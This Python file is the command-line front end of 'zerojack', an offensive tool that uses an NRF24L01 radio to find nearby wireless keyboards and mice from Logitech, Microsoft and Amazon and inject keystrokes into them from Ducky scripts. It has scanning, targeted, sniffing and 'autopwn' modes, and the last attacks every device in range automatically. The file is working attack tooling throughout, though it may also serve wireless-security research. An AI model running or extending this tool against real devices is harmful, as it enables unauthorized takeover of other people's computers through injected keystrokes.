#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import datetime
import click
import tabulate
from zerojack import duckyparser
from zerojack import mousejack
from zerojack import keylogger

__VERSION__ = '0.1.0'
__AUTHOR__ = 'b1narygl1tch'
__DEBUG__ = False
SPI_MAJOR = 0
SPI_MINOR = 0
CE_PIN = 25
IRQ_PIN = 24

def banner():
    print(r'''
                            __               __    
.-----..-----..----..-----.|__|.---.-..----.|  |--.
|-- __||  -__||   _||  _  ||  ||  _  ||  __||    < 
|_____||_____||__|  |_____||  ||___._||____||__|__|
                          |___|                    
''')
    print(f'Version {__VERSION__}')
    print(f'Created by {__AUTHOR__}')
    print('')
    
def print_error(msg, new_line=True):
    click.secho(message=msg, nl=new_line, fg='red')

def print_info(msg, new_line=True):
    click.secho(message=msg, nl=new_line, fg='yellow')

def print_green(msg, new_line=True):
    click.secho(message=msg, nl=new_line, fg='green')
    
def to_hex_string(data):
    result = None
    try:
        result = ':'.join('{:02X}'.format(x) for x in data)
    except:
        print('to_hex_string(): Failed to convert bytes list to hexadecimal string!')
        sys.exit(-1)
    return result

def display_devices(devices={}):
    table_format = 'fancy_grid'
    click.clear()
    print('\033[H\033[3J', end='') # Clear terminal and scrollback buffer.
    banner()
    
    print_info(f'[i] Scanning for wireless devices. Press Ctrl+C when ready.')
    print()
    
    pretty_devices = []
    for addr_string, device in devices.items():
        # Shrink payload length to avoid table rows shifting.
        payload_to_display = to_hex_string(device['payload'])
        if len(payload_to_display) > 29:
            payload_to_display = payload_to_display[:30] + '<...>'

        # Shrink channels list length to avoid table rows shifting.
        if len(device['channels']) > 3:
            channels_to_display = ','.join(str(x) for x in device['channels'][:3]) + ',..'
        else:
            channels_to_display = ','.join(str(x) for x in device['channels'])

        if device['device']:
            device_name = device['device'].description()
        else:
            device_name = 'Unknown'
        pretty_devices.append([
                device['index'],
                addr_string,
                channels_to_display,
                device['count'],
                str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
                device_name,
                payload_to_display
        ])

    print(tabulate.tabulate(pretty_devices, headers=['KEY', 'ADDRESS', 'CHANNELS', 'COUNT', 'SEEN', 'TYPE', 'PACKET'], tablefmt=table_format))

def scan_loop(jack):
    '''
    A simple wrapper around MouseJack scan() method to support keyboard interrupt.
    '''
    try:
        while True:
            jack.scan(display_devices)
            display_devices(jack.devices)
    except KeyboardInterrupt:
        print()
        return

def launch_attack(jack, targets, attack, no_ping=False):
    for addr_string, target in targets.items():
        payload  = target['payload']
        channels = target['channels']
        address  = target['address']
        hid      = target['device']

        if hid:
            # Attempt to ping a device to find the current active channel.
            active_channel = None
            if no_ping:
                # If --no-ping provided then attack all the passively found channels.
                print_info('[i] Active channel search disabled. Trying to attack all passively found channels.')
                for channel in channels:
                    jack.set_channel(channel)
                    print_green(f'[*] Sending attack to {addr_string} [{hid.description()}] on channel {channel}\n')
                    jack.attack(hid(address, payload), attack)
                continue
            else:
                active_channel = jack.find_active_channel(address, channels) # Ping only passively found channels.
                if not active_channel:
                    active_channel = jack.find_active_channel(address, jack.channels) # Use all the channels range.

            if active_channel:
                print_green(f'[+] Successful ping on channel {active_channel}')
                print_green(f'[*] Sending attack payload to {addr_string} [{hid.description()}] on channel {active_channel}\n')
                jack.set_channel(active_channel)
                jack.attack(hid(address, payload), attack)
            else:
                print_info(f'[i] Cannot find an active channel for {addr_string} [{hid.description()}]!')
                print_info('[i] Target device can be out of range or disconnected.\n')
                
        else:
            print_info(f'[-] Target {addr_string} is not injectable. Skipping...')
            continue
    return

def repeat_attack(jack, target, attack, retries):
    ''' Just a wrapper around launch_attack() for autopwn mode needs. '''
    for addr_string, device in target.items():
        hid = device['device']
        print_green(f'[+] Target {addr_string} [{hid.description()}] has been found!')
        print_green(f'[*] Trying to attack it {retries} time(s).')
        for n_try in range(retries):
            launch_attack(jack, target, attack)
        break # Execute the loop once. We just need to get addr_string and device here.

def parse_script(script, layout):
    ''' Parses provided attack script. '''
    attack = ''
    if (script and os.path.isfile(script)):
        try:
            f = open(script, 'r')
            parser = duckyparser.DuckyParser(f.read(), layout=layout.lower())
            attack = parser.parse()
        except KeyError:
            print_error('[ERR] Invalid keyboard layout specified!\n')
            sys.exit(-1)
        except UserWarning as uw:
            print_error(f'[ERR] {uw}')
            print_info(f'[i] Check your payload script!\n')
            sys.exit(-1)
        finally:
            f.close()
    return attack

def init_radio():
    ''' Initialize the radio device. '''
    jack = None
    try:
        jack = mousejack.MouseJack(SPI_MAJOR, SPI_MINOR, CE_PIN, IRQ_PIN)
    except FileNotFoundError as e:
        if ('No such file or directory' in e.__str__()):
            print_error('[ERR] Cannot initialize radio device!')
            print_info('[i] Check if SPI (dtparam=spi=on) is enabled.\n')
            sys.exit(-1)
        else:
            raise e
    return jack

def no_error_exit(jack):
    print_green('[*] Attacks completed!\n')
    jack.finish()
    sys.exit(0)

def kb_exit(jack):
    print_info('\n[i] Interrupted by user.')
    print_info('[-] Termination.\n')
    jack.finish()
    sys.exit(0)

@click.group()
@click.option('--debug', is_flag=True, help='Enable debug output.')
def cli(debug):

    click.clear()
    print('\033[H\033[3J', end='') # Clear terminal and scrollback buffer.
    banner()

    if debug:
        __DEBUG__ = True
        print_info('[i] Debug is enabled.') # Not implemented at the moment.

@cli.command(name='main', short_help='Find, select and attack target devices.')
@click.option('-l', '--layout', default='US', help='Keyboard layout: RU, US, GB, etc.', required=False, show_default=True)
@click.option('-s', '--script', help='Path to script file to use for injection.',
                                type=click.Path(exists=True, file_okay=True, dir_okay=False, readable=True), required=False)
@click.option('--no-ping', is_flag=True, help='Don\'t ping to detect an active channel.')
def main_mode(layout, script, no_ping):
    '''
    Main mode: search for target devices, select and execute keystrokes injection attack.
    '''
    jack = init_radio()
    if not jack:
        print_error('[ERR] NRF24L01(+) device wasn\'t initialized!\n')
        sys.exit(-1)

    attack_payload = parse_script(script, layout)
    if not attack_payload:
        print_info('[i] Script wasn\'t specified or doesn\'t exist. Attacks are disabled.')
        print_info('[i] Press Enter to continue in scanning mode.', False)
        input()

    # Prepare CLI and enable NRF24L01 promiscuous mode.
    display_devices()
    jack.enter_promiscuous_mode()
    # Launch scanning in promiscuous mode.
    scan_loop(jack)

    if len(jack.devices) == 0:
        print_info('[i] No devices found! Try again.\n')
        jack.finish()
        sys.exit(-1)

    if not attack_payload:
        print_info('[i] No any attack script was provided!')
        print_info('[-] Termination.\n')
        jack.finish()
        sys.exit(-1)
    try:
        print_green(f'\n[*] Select target keys (1-{len(jack.devices)}) separated by commas or type "all"(default): ', False)
        value = input() or 'all'
        value = value.strip().lower()
        print()
    except KeyboardInterrupt:
        kb_exit(jack)

    targets = {}
    try:
        if value == 'all':
            targets = jack.devices
        else:
            target_list = [int(x) for x in value.split(',')]
            for addr_string, device in jack.devices.items():
                if device['index'] in target_list:
                    targets[addr_string] = device
    except:
        print_error(f'[ERR] Incorrect targets keys!\n')
        jack.finish()
        sys.exit(-1)

    launch_attack(jack, targets, attack_payload, no_ping)

    no_error_exit(jack)

@cli.command(name='targeted', short_help='Attack device with specified address.', no_args_is_help=True)
@click.option('-a', '--address', help='Device address to attack (format XX:XX:XX:XX:XX).', required=True)
@click.option('-v', '--vendor', help='Target device vendor name (case insensitive).',
                                type=click.Choice(['Amazon', 'Logitech', 'Microsoft'], case_sensitive=False), required=True)
@click.option('-s', '--script', help='Path to script file to use for injection.',
                                type=click.Path(exists=True, file_okay=True, dir_okay=False, readable=True), required=True)
@click.option('-l', '--layout', default='US', help='Keyboard layout: RU, US, GB, etc.', required=False, show_default=True)
def targeted_mode(address, vendor, script, layout):
    '''
    Targeted mode: inject keystrokes to device with specified address.
    '''
    try:
        address = address.upper()
        if not re.match('^([0-9A-Fa-f]{2}[:]){4}([0-9A-Fa-f]{2})$', address):
            print_error('[ERR] Address format must be XX:XX:XX:XX:XX where XX is a hexadecimal number!\n')
            sys.exit(-1)

        jack = init_radio()
        if not jack:
            print_error('[ERR] NRF24L01(+) device wasn\'t initialized!\n')
            sys.exit(-1)

        attack_payload = parse_script(script, layout)
        if not attack_payload:
            print_error('[ERR] Script wasn\'t specified or doesn\'t exist!\n')
            sys.exit(-1)

        print_info('[i] Targeted attack mode.\n')
        jack.clear_devices() # Clear devices list.
        addr_bytes = jack.from_display(address)
        if vendor.lower() == 'logitech':
            jack.add_device(addr_bytes, [0, 0xC2, 0, 0, 0, 0, 0, 0, 0, 0], 0)
        elif vendor.lower() == 'microsoft':
            jack.add_device(addr_bytes, [0x08,0x90,0,0,0,0,0x40,0,0,0,0,0,0,0,0,0,0,0,0], 0)
        elif vendor.lower() == 'amazon':
            jack.add_device(addr_bytes, [0, 0, 0, 0, 0, 0xF0], 0)
        else:
            print_error('[ERR] Unknown vendor was provided!\n')
            jack.finish()
            sys.exit(-1)

        print_green(f'[*] Trying to find an active channel for address {address}')
        for search_try in range(3): # Try to search for an active channel 3 times.
            active_channel = jack.find_active_channel(addr_bytes, jack.channels)
            if active_channel:
                break
        if active_channel:
            print_green(f'[+] Successful ping on channel {active_channel}')
            hid = jack.devices.get(address)['device']
            payload = jack.devices.get(address)['payload']
            print_green(f'[*] Sending attack payload to {address} [{hid.description()}] on channel {active_channel}')
            jack.set_channel(active_channel)
            jack.attack(hid(addr_bytes, payload), attack_payload)
        else:
            print_error(f'[ERR] Cannot find an active channel!')
            print_info('[i] Target device can be out of range or disconnected.\n')
            jack.finish()
            sys.exit(-1)

        no_error_exit(jack)

    except KeyboardInterrupt:
        kb_exit(jack)

@cli.command(name='sniffer', short_help='Sniff a particular address.', no_args_is_help=True)
@click.option('-a', '--address', help='Device address to sniff (format XX:XX:XX:XX:XX).', required=True)
@click.option('-t', '--time', default=0.3, help='A channel dwell time (how long to listen to a channel).',
                            type=click.FloatRange(0.1, 2), required=False, show_default=True)
def sniffer_mode(address, time):
    '''
    Sniffer mode: dump raw data from a device with specified address.
    '''
    try:
        address = address.upper()
        if not re.match('^([0-9A-Fa-f]{2}[:]){4}([0-9A-Fa-f]{2})$', address):
            print_error('[ERR] Address format must be XX:XX:XX:XX:XX where XX is a hexadecimal number!\n')
            sys.exit(-1)

        jack = init_radio()
        if not jack:
            print_error('[ERR] NRF24L01(+) device wasn\'t initialized!\n')
            sys.exit(-1)

        print_info('[i] Sniffer mode. Press Ctrl+C to exit.\n')
        jack.clear_devices() # Clear devices list.
        addr_bytes = jack.from_display(address)

        jack.sniff(addr_bytes, time)

    except KeyboardInterrupt:
        kb_exit(jack)

@cli.command(name='autopwn', short_help='Continuously scan and attack. USE CAREFULLY!', no_args_is_help=True)
@click.option('-s', '--script', help='Path to script file to use for injection.',
                                type=click.Path(exists=True, file_okay=True, dir_okay=False, readable=True), required=True)
@click.option('-l', '--layout', default='US', help='Keyboard layout: RU, US, GB, etc.', required=False, show_default=True)
@click.option('-r', '--retries', default=1, help='Attack retries count.', type=click.IntRange(1, 5), required=False, show_default=True)
def autopwn_mode(script, layout, retries):
    '''
    Autopwn mode: continuously search for targets and inject keystrokes automatically. USE CAREFULLY!
    '''
    try:

        jack = init_radio()
        if not jack:
            print_error('[ERR] NRF24L01(+) device wasn\'t initialized!\n')
            sys.exit(-1)

        attack_payload = parse_script(script, layout)
        if not attack_payload:
            print_error('[ERR] Script wasn\'t specified or doesn\'t exist!\n')
            sys.exit(-1)

        print_info('[i] Autopwn mode. Press Ctrl+C to exit.\n')
        jack.clear_devices() # Clear devices list.

        jack.enter_promiscuous_mode()
        attacked_devices = [] # Already attacked devices list.

        while True:
            jack.scan()

            for addr_string, device in jack.devices.items():
                target = {}
                if (addr_string not in attacked_devices):
                    attacked_devices.append(addr_string)
                    target[addr_string] = device
                    repeat_attack(jack, target, attack_payload, retries)
                    print('+------') # Print separator.
                    jack.enter_promiscuous_mode()

    except KeyboardInterrupt:
        kb_exit(jack)